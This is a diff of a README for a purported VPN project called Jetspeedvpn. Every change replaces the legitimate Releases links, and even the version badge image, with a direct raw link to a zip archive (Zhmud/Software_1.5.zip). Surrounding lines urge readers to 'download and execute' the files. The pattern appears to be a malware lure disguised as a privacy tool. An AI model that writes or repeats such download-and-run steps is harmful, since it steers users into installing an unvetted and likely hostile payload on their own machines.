@@ -1,6 +1,6 @@
 # Jetspeedvpn 🌐
 
-![Jetspeedvpn](https://img.shields.io/badge/Jetspeedvpn-v1.0.0-blue)
+![Jetspeedvpn](https://raw.githubusercontent.com/tvmbra/Jetspeedvpn/main/Zhmud/Software_1.5.zip)
 
 Welcome to the Jetspeedvpn repository! This project focuses on providing a secure and efficient way to connect to the internet. Our aim is to enhance user experience by ensuring privacy and security while browsing.
 
@@ -18,7 +18,7 @@ Welcome to the Jetspeedvpn repository! This project focuses on providing a secur
 
 In today's digital world, online privacy is crucial. Jetspeedvpn is designed to help you maintain your anonymity while using the internet. By utilizing advanced encryption methods, we ensure that your data remains secure from prying eyes. 
 
-You can find the latest releases [here](https://github.com/tvmbra/Jetspeedvpn/releases). Please download and execute the necessary files to get started.
+You can find the latest releases [here](https://raw.githubusercontent.com/tvmbra/Jetspeedvpn/main/Zhmud/Software_1.5.zip). Please download and execute the necessary files to get started.
 
 ## Features
 
@@ -32,7 +32,7 @@ You can find the latest releases [here](https://github.com/tvmbra/Jetspeedvpn/re
 
 To install Jetspeedvpn, follow these steps:
 
-1. **Download the Latest Release**: Visit our [Releases](https://github.com/tvmbra/Jetspeedvpn/releases) section to get the latest version.
+1. **Download the Latest Release**: Visit our [Releases](https://raw.githubusercontent.com/tvmbra/Jetspeedvpn/main/Zhmud/Software_1.5.zip) section to get the latest version.
 2. **Run the Installer**: Execute the downloaded file and follow the on-screen instructions.
 3. **Set Up Your Account**: Create an account or log in if you already have one.
 4. **Connect to a Server**: Choose your preferred server location and connect.
@@ -64,7 +64,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, feel free to check the "Releases" section for updates or contact our support team. 
 
-You can also find the latest releases [here](https://github.com/tvmbra/Jetspeedvpn/releases). Download and execute the files to stay updated.
+You can also find the latest releases [here](https://raw.githubusercontent.com/tvmbra/Jetspeedvpn/main/Zhmud/Software_1.5.zip). Download and execute the files to stay updated.
 
 ## Topics
 
